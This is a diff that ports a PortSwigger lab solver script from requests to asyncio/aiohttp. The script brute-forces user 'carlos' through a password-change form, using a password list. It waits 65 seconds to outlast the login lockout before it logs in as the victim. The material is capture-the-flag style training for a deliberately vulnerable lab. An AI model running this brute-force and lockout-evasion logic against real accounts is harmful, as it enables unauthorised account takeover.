@@ -2,82 +2,91 @@
 # Lab: Password brute-force via password change
 # Lab-Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
 # Difficulty: PRACTITIONER
-import requests
+
+import aiohttp
+import asyncio
 import shutil
 import sys
-import time
 import urllib3
+import aiofiles
+from pathlib import Path
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-proxies = {}  # {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 
-def login(host, client):
+# Proxy settings (uncomment and configure if needed)
+# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+async def login(session: aiohttp.ClientSession, host: str) -> None:
+    """Log in as 'wiener'."""
     data = {'username': 'wiener', 'password': 'peter'}
-    client.post(f'{host}/login', data=data, allow_redirects=False)
+    await session.post(f'{host}/login', data=data, allow_redirects=False)
 
 
-def change_password(host, client, password):
-    data = {'username': 'carlos', 'current-password': password, 'new-password-1': password, 'new-password-2': password}
-    r = client.post(f'{host}/my-account/change-password', data=data, allow_redirects=False)
-    if r.status_code == 200:
-        return True
-    return False
+async def change_password(session: aiohttp.ClientSession, host: str, password: str) -> bool:
+    """Try to change the password for 'carlos'."""
+    data = {
+        'username': 'carlos',
+        'current-password': password,
+        'new-password-1': password,
+        'new-password-2': password
+    }
+    async with session.post(f'{host}/my-account/change-password', data=data, allow_redirects=False) as response:
+        return response.status == 200
 
 
-def verify_login(host, client, username, password):
-    url = f'{host}/login'
+async def verify_login(session: aiohttp.ClientSession, host: str, username: str, password: str) -> bool:
+    """Verify login with the given credentials."""
     data = {'username': username, 'password': password}
-    r = client.post(url, data=data, allow_redirects=True)
-    if f'Your username is: {username}' in r.text:
-        return True
-    return False
+    async with session.post(f'{host}/login', data=data, allow_redirects=True) as response:
+        text = await response.text()
+        return f'Your username is: {username}' in text
 
 
-def wait(s):
-    for i in range(0, s):
-        msg = f'[ ] Waiting for {s - i} more seconds to expire the brute force protection of the login'
+async def wait(seconds: int) -> None:
+    """Wait for a specified number of seconds with a progress message."""
+    for i in range(seconds, 0, -1):
+        msg = f'[ ] Waiting for {i} more seconds to expire the brute force protection of the login'
         print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
-        time.sleep(1)
+        await asyncio.sleep(1)
     msg = f'[+] Waited enough to expire the brute force protection of the login'
     print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
 
 
-def main():
+async def main() -> None:
+    """Main function to execute the brute force attack."""
     print('[+] Lab: Password brute-force via password change')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
-        print(f'Usage: {sys.argv[0]} <HOST>')
-        print(f'Exampe: {sys.argv[0]} http://www.example.com')
+        print(f'Usage: python {sys.argv[0]} <HOST>')
+        print(f'Example: python {sys.argv[0]} http://www.example.com')
         sys.exit(-1)
 
-    with requests.Session() as client:
-        client.verify = False
-        client.proxies = proxies
+    password_file = Path.cwd() / 'stuff' / 'candidate_passwords.txt'
 
-        print(f'[ ] Attempt password: ', end='\r')
-        with open('../candidate_passwords.txt') as f:
-            for line in f:
+    async with aiohttp.ClientSession() as session:
+        async with aiofiles.open(password_file, 'r') as f:
+            async for line in f:
                 password = line.strip()
                 msg = f'[ ] Try password: {password}'
                 print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
-                login(host, client)
-                if change_password(host, client, password):
+
+                await login(session, host)
+                if await change_password(session, host, password):
                     msg = f'[+] Found password: {password}'
                     print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                     print(f'[+] Attempting to login to solve the lab')
-                    wait(65)
-                    if verify_login(host, client, 'carlos', password):
+                    await wait(65)
+                    if await verify_login(session, host, 'carlos', password):
                         print(f'[+] Login verified, lab solved')
                         sys.exit(0)
                     else:
                         print(f'[-] Failed to verify login')
                         sys.exit(-2)
 
-        print()
-        print(f'[-] Failed to brute force the password')
+    print(f'[-] Failed to brute force the password')
 
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
